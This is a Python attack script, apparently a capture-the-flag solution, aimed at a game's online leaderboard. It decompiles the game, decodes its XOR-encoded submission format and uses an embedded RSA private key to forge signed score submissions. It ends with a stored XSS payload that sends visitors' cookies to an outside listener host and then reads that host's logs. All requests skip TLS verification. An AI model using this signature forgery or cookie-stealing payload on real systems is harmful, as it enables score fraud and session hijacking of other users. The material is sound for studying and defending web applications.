import pathlib
import requests
import zipfile
import io
from sh import Command

BIN_PATH = pathlib.Path("bin")
BIN_PATH.mkdir(exist_ok=True)

GAME_PATH = BIN_PATH / "game.pck"
GAME_URL = "https://dodgethecreeps/index.pck"

if not GAME_PATH.exists():
    with requests.get(GAME_URL, stream=True, verify=False) as response, open(GAME_PATH, "wb") as file:
        for chunk in response.iter_content(chunk_size=8192):
            file.write(chunk)

TOOLS_PATH = pathlib.Path("tools")
TOOLS_PATH.mkdir(exist_ok=True)

GDRE_TOOLS_PATH = TOOLS_PATH / "gdre_tools.x86_64"

if not GDRE_TOOLS_PATH.exists():
    # Download the zip file
    url = "https://dodgethecreeps/tools/gdre_tools_linux_x86_64.zip"
    response = requests.get(url, verify=False)
    response.raise_for_status()

    # Unzip to "tools" directory
    with zipfile.ZipFile(io.BytesIO(response.content)) as z:
        z.extractall("tools")

    print("Downloaded and extracted GDRE_tools to ./tools")
else:
    print("GDRE_tools is already downloaded and extracted.")

chmod = Command("chmod")
chmod('+x', 'tools/gdre_tools.x86_64')
gdsdecomp = Command("tools/gdre_tools.x86_64")

result = gdsdecomp('--headless', '--recover=bin/game.pck', f'--output=game')
if result is None:
    print("Decompilation failed.")
elif isinstance(result, str):
    print(result)
else:
    print(result.wait())

from itertools import batched

def decode_submission(submission: bytes) -> str:
    return ''.join(chr(int.from_bytes(i, 'big') ^ 0xDEAD) for i in batched(submission, 4, strict=True))

body = b"\x00\x00\xde\xd6\x00\x00\xde\x8f\x00\x00\xde\xc3\x00\x00\xde\xcc\x00\x00\xde\xc0\x00\x00\xde\xc8\x00\x00\xde\x8f\x00\x00\xde\x97\x00\x00\xde\x8f\x00\x00\xde\x8f\x00\x00\xde\x81\x00\x00\xde\x8f\x00\x00\xde\xde\x00\x00\xde\xce\x00\x00\xde\xc2\x00\x00\xde\xdf\x00\x00\xde\xc8\x00\x00\xde\x8f\x00\x00\xde\x97\x00\x00\xde\x98\x00\x00\xde\x81\x00\x00\xde\x8f\x00\x00\xde\xd9\x00\x00\xde\xc2\x00\x00\xde\xc6\x00\x00\xde\xc8\x00\x00\xde\xc3\x00\x00\xde\x8f\x00\x00\xde\x97\x00\x00\xde\x8f\x00\x00\xde\xce\x00\x00\xde\xc4\x00\x00\xde\xe1\x00\x00\xde\xf5\x00\x00\xde\xdb\x00\x00\xde\xc3\x00\x00\xde\xca\x00\x00\xde\xf7\x00\x00\xde\x80\x00\x00\xde\x98\x00\x00\xde\x94\x00\x00\xde\x9a\x00\x00\xde\x9e\x00\x00\xde\x9e\x00\x00\xde\x8f\x00\x00\xde\xd0"
print(decode_submission(body))

import json
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.asymmetric import padding, utils, rsa
from cryptography.hazmat.primitives import serialization
PRIVATE_KEY = serialization.load_pem_private_key(
    "-----BEGIN RSA PRIVATE KEY-----\n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\n-----END RSA PRIVATE KEY-----".encode(),
    password=None
)


def submit_to_leaderboard(body):
    message = json.dumps(body)
    hasher = hashes.Hash(hashes.SHA256())
    hasher.update(message.encode('utf-8'))
    message_hash = hasher.finalize()
    assert isinstance(PRIVATE_KEY, rsa.RSAPrivateKey)
    signature = PRIVATE_KEY.sign(message_hash, padding.PKCS1v15(), utils.Prehashed(hashes.SHA256()))
    # This has to use localhost for testing but once on platform 
    # can use server instead
    message = b''.join((ord(c) ^ 0xDEAD).to_bytes(4, 'big') for c in message)
    response = requests.post("https://dodgethecreeps/submit", verify=False, data=message, headers={
        "content-type": "application/json",
        "Data-Signature": signature.hex()
    })
    
    print(response)

submit_to_leaderboard({'name': 'TTT', 'score': 2_000_000})

submit_to_leaderboard({'name': 'PWN<div></div>', 'score': 2_000_001})

submit_to_leaderboard({
    'name': "<img src=x onerror=this.src='https://listener/200/'+document.cookie;>",
    'score': 2_000_000
})

import time
time.sleep(10)
response = requests.get("https://listener/logs", verify=False)
logs = response.json()
print(logs)
